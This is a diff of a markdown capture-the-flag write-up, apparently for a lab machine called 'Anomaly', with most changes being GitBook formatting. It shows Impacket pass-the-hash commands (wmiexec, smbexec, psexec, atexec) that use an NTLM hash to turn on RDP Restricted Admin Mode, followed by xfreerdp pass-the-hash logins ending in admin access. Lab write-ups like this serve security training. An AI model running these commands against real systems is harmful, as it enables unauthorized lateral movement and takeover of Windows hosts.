+    *   Since we know `anna_molly` has the rights to start services and read the registry (proven by `secretsdump`), we shall use it to enable **Restricted Admin Mode** for the whole system
+
         ```bash
         impacket-wmiexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
-        
+
         OR
-        
+
         impacket-smbexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52'
-        
+
         #Run the Registry command manually
         reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
-        
+
         #Verify the Registry Key Run this to see if the value is now 0x0
         reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
-        
+
         OR
-        
+
         impacket-psexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
-        
+
         xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
         ```
-        
-        ![image.png](Anomaly/image%2048.png)
-        
-        - `psexec` successfully **uploaded** the binary, **created** the service, and **started** it. The "Error performing uninstallation" simply means the RPC connection died before the service could report its final exit code back to your Kali machine.
-    
-    ***Run the RDP command as `anna_molly`:***
-    
+
+        ![image.png](<../.gitbook/assets/image 48 (2).png>)
+
+        * `psexec` successfully **uploaded** the binary, **created** the service, and **started** it. The "Error performing uninstallation" simply means the RPC connection died before the service could report its final exit code back to your Kali machine.
+
+    _**Run the RDP command as****&#x20;****`anna_molly`****:**_
+
     ```bash
     xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
     ```
-    
-    ![image.png](Anomaly/image%2049.png)
-    
-    - **"Account restrictions are preventing this user from signing in"** is the classic symptom of a successful connection where **Restricted Admin Mode** is still technically disabled or being blocked by a local policy
 
-***Use `atexec` (The Task Scheduler)***
+    ![image.png](<../.gitbook/assets/image 49 (2).png>)
+
+    * **"Account restrictions are preventing this user from signing in"** is the classic symptom of a successful connection where **Restricted Admin Mode** is still technically disabled or being blocked by a local policy
+
+_**Use****&#x20;****`atexec`****&#x20;****(The Task Scheduler)**_
 
 `atexec` is often more reliable in high-latency environments because it creates a scheduled task, runs it, and then retrieves the output. It doesn't rely on a persistent service connection like `psexec`.
 
@@ -1190,9 +1187,9 @@ xfreerdp3 /v:10.1.69.52 /u:Administrator /d:anomaly.hsm /pth:31592a42841d0a9e74f
 impacket-atexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_molly@10.1.69.52' "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
 ```
 
-![image.png](Anomaly/image%2050.png)
+![image.png](<../.gitbook/assets/image 50 (1).png>)
 
-***Add `anna_molly` to the RDP Group***
+_**Add****&#x20;****`anna_molly`****&#x20;****to the RDP Group**_
 
 Even as an Admin, sometimes Server 2025 requires explicit group membership for NLA to pass through `/restricted-admin`. Run this immediately after.
 
@@ -1204,8 +1201,8 @@ impacket-atexec -hashes ':be4bf3131851aee9a424c58e02879f6e' 'anomaly.hsm/anna_mo
 xfreerdp3 /v:10.1.69.52 /u:anna_molly /d:anomaly.hsm /pth:be4bf3131851aee9a424c58e02879f6e /cert:ignore /restricted-admin /dynamic-resolution +clipboard /drive:$(pwd),share
 ```
 
-![image.png](Anomaly/image%2051.png)
+![image.png](<../.gitbook/assets/image 51 (1).png>)
 
-### BOOM ROOOOOOOOOOOOOOOOOOT!!!!!
+#### BOOM ROOOOOOOOOOOOOOOOOOT!!!!!
 
-![image.png](Anomaly/image%2052.png)
+![image.png](<../.gitbook/assets/image 52 (1).png>)
